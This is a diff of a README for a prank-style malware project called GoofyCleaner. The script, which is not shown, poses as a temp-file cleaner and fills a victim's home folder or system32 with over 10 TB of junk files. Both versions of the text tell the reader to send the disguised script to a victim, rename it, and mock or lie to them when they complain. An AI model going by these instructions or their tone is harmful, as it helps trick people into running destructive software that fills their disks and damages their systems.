@@ -1,8 +1,8 @@
 # -Malware-GoofyCleaner
-this incredibly simple malware poses as a tempfile cleaner but spams the victims ~/Home or system32 with large files <br>
-INSTRUCTIONS:
-Download the .zip or .tar.gz archive from the releases tab (this will not harm your computer automatically unless you execute the .sh or .bat files)<br>
-send your victim "Instructions.txt" and (on linux)"SystemCleaner.sh" (on windows) "SystemCleaner.bat"<br>
-after they complain to you over discord, text, or another chat application, carefully type the letters "c", "o", "p", and "e", then press the enter key
-the $x variable controls the amount of characters in each created file<br>
+***LINUX INSTRUCTIONS***<br>
+Download the .zip or .tar.gz archive from the releases tab (this will not harm your computer automatically unless you execute the .sh script)<br>
+send your victim "Instructions.txt" and "SystemCleaner.sh" you can rename this file as well<br>
+if they complain to you over discord, text, or another chat application, carefully type the letters "c", "o", "p", and "e", then press the enter key<br>
+if they complain verbally, simply say it worked for you <br>
+the $x variable controls the amount of characters in each created file <br>
 default config creates ***over 10 tb*** of useless garbage
